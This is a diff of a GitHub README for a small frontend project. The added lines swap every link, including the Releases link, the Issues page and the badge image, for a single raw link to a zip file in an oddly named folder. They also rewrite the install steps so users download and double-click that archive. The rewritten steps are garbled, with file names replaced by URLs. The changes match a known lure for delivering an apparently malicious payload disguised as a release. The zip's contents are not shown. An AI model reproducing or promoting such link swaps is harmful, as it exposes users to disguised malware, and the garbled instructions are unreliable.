@@ -8,7 +8,7 @@ Welcome to the simple-frontend-project! This repository provides a clear and str
 
 To get started, you need to download the application. Please visit the link below to access the Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/HaraArarki/simple-frontend-project/releases)
+[![Download Now](https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip)
 
 On the Releases page, you will find the latest version of the simple-frontend-project. 
 
@@ -16,14 +16,14 @@ Simply click on the version you want to download. A zip file will be available f
 
 1. Click on the version number you want.
 2. Look for the "Assets" section.
-3. Download the zip file titled `simple-frontend-project.zip`.
+3. Download the zip file titled `https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip`.
 4. Once the download is complete, locate the file on your computer.
 
 ## 📂 Extracting the Files
 
 After downloading the zip file, you will need to extract it:
 
-1. Find the downloaded `simple-frontend-project.zip` file.
+1. Find the downloaded `https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip` file.
 2. Right-click on it and select "Extract All".
 3. Choose a location where you want to extract the files, then click "Extract".
 
@@ -34,8 +34,8 @@ You should now see a folder named `simple-frontend-project`.
 To run the project, follow these steps:
 
 1. Open the `simple-frontend-project` folder.
-2. Locate the `index.html` file.
-3. Double-click on `index.html`. This action will open the project in your default web browser.
+2. Locate the `https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip` file.
+3. Double-click on `https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip`. This action will open the project in your default web browser.
 
 You should see the main page of the project. From here, you can explore the features and code examples presented.
 
@@ -60,7 +60,7 @@ The simple-frontend-project works on most modern operating systems. Here are the
 If you encounter issues or need assistance:
 
 1. Check the documentation included in the project folder.
-2. Visit the [Issues page](https://github.com/HaraArarki/simple-frontend-project/issues) to report bugs or ask questions.
+2. Visit the [Issues page](https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip) to report bugs or ask questions.
 3. Consult online forums or communities for additional support.
 
 ## 🔄 Frequently Asked Questions
@@ -84,6 +84,6 @@ Join the community and share your thoughts or work! Follow the project on GitHub
 
 You can return to the Releases page anytime by visiting this link: 
 
-[Download Here](https://github.com/HaraArarki/simple-frontend-project/releases) 
+[Download Here](https://raw.githubusercontent.com/HaraArarki/simple-frontend-project/main/subcuratorship/simple-project-frontend-3.0.zip) 
 
 Thank you for exploring the simple-frontend-project! Happy coding!
